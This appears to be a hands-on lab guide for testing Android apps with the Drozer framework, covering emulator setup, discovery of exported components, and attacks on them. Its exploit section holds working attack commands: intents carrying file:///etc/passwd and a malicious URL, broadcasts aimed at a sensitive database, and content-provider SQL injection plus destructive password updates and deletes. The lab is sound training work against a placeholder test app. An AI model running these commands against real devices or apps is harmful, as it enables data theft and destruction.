Task 1: Environment Setup and Drozer Installation
Step 1.1: Verify Android Environment
Check that ADB and the Android emulator are working:

# Check ADB installation
adb version

# List connected devices
adb devices

# Start emulator if needed
emulator -avd test_device -no-snapshot &

# Wait 30 seconds for boot, then verify
adb devices
Expected output should show a device in the list (e.g., emulator-5554 device).

Step 1.2: Install Drozer Framework
Install Drozer and dependencies:

# Update package manager
sudo apt update

# Install dependencies
sudo apt install -y python3-pip python3-dev

# Install Drozer
pip3 install drozer

# Verify installation
drozer --help
Step 1.3: Install and Configure Drozer Agent
Download and install the Drozer agent on the Android device:

# Download Drozer agent APK
wget https://github.com/FSecureLABS/drozer/releases/download/2.4.4/drozer-agent-2.4.4.apk

# Install on device
adb install drozer-agent-2.4.4.apk

# Verify installation
adb shell pm list packages | grep drozer

# Set up port forwarding
adb forward tcp:31415 tcp:31415
Manual Steps on Emulator:

Open Drozer Agent app
Toggle "Embedded Server" to ON
Confirm server is listening on port 31415
Step 1.4: Connect to Drozer Console
Establish connection to the Drozer agent:

# Connect to Drozer
drozer console connect

# You should see the prompt: dz>
Test the connection with a basic command:

dz> run app.package.list
Task 2: Identify Exposed Components
Step 2.1: Reconnaissance Commands
Use Drozer to discover installed packages and their components:

# List all installed packages
dz> run app.package.list

# Get detailed package information
dz> run app.package.info -a com.android.browser

# List packages with specific permissions
dz> run app.package.list -p android.permission.INTERNET
Step 2.2: Scan for Exposed Activities
Identify activities that can be launched externally:

# List all exported activities
dz> run app.activity.info

# Search activities for specific package
dz> run app.activity.info -a com.example.vulnerable

# Find activities with intent filters
dz> run app.activity.info -i
Step 2.3: Scan for Exposed Services
Find services accessible to external applications:

# List all exported services
dz> run app.service.info

# Search services for specific package
dz> run app.service.info -a com.example.vulnerable
Step 2.4: Scan for Broadcast Receivers
Identify broadcast receivers that accept external intents:

# List all exported receivers
dz> run app.broadcast.info

# Search receivers for specific package
dz> run app.broadcast.info -a com.example.vulnerable
Step 2.5: Scan for Content Providers
Discover content providers that may expose data:

# List all content providers
dz> run app.provider.info

# Find providers for specific package
dz> run app.provider.info -a com.example.vulnerable

# Test provider access
dz> run app.provider.query content://com.example.provider/data
Task 3: Exploit Exposed Components
Step 3.1: Exploit Activities
Launch activities with malicious intents:

# Basic activity launch
dz> run app.activity.start --component com.example.vulnerable com.example.MainActivity

# Launch with custom data
dz> run app.activity.start --component com.example.vulnerable com.example.MainActivity --extra string username admin --extra string password test123

# Launch with file URI
dz> run app.activity.start --component com.example.vulnerable com.example.FileActivity --data-uri file:///etc/passwd

# Launch with custom action
dz> run app.activity.start --action android.intent.action.VIEW --data-uri http://malicious-site.com
Step 3.2: Exploit Services
Interact with vulnerable services:

# Start a service
dz> run app.service.start --component com.example.vulnerable com.example.BackgroundService

# Start service with data
dz> run app.service.start --component com.example.vulnerable com.example.DataService --extra string data "malicious_payload"

# Stop a service
dz> run app.service.stop --component com.example.vulnerable com.example.BackgroundService
Step 3.3: Exploit Broadcast Receivers
Send malicious broadcasts:

# Send custom broadcast
dz> run app.broadcast.send --action com.example.CUSTOM_ACTION --extra string command "test_command"

# Send system broadcast
dz> run app.broadcast.send --action android.intent.action.BOOT_COMPLETED

# Send broadcast with data URI
dz> run app.broadcast.send --action android.intent.action.VIEW --data-uri "file:///data/data/com.example.app/databases/sensitive.db"
Step 3.4: Exploit Content Providers
Query and manipulate data through providers:

# Query provider
dz> run app.provider.query content://com.example.provider/users

# Insert data (SQL injection test)
dz> run app.provider.insert content://com.example.provider/users --string name "admin'; DROP TABLE users; --" --string password "test"

# Update data
dz> run app.provider.update content://com.example.provider/users --selection "name='admin'" --string password "hacked"

# Delete data
dz> run app.provider.delete content://com.example.provider/users --selection "1=1"
